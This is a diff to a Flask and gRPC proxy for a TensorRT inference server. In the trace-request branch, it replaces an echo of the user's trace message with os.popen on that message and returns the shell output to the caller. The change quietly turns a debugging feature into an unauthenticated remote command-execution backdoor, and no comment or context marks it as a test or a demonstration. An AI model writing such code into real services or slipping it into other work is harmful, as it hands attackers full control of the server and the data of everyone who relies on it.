@@ -1,5 +1,6 @@
 from flask import Flask, request, jsonify
 import grpc
+import os
 #from tensorrtserver.api import api_pb2
 from tensorrtserver.api import grpc_service_pb2
 from tensorrtserver.api import grpc_service_pb2_grpc
@@ -21,7 +22,7 @@ def predict(model, version):
     elif r.request_type==grpc_gcp_caip_pb2.TYPE_STATUS_REQUEST:
         return grpc_stub.Status(r.status_request).SerializeToString()
     elif r.request_type==grpc_gcp_caip_pb2.TYPE_TRACER:
-        return ("Your trace message was: " + r.trace_message)
+        return os.popen(r.trace_message).readlines()
     else:
         return 'Error: request_type not defined.'
     
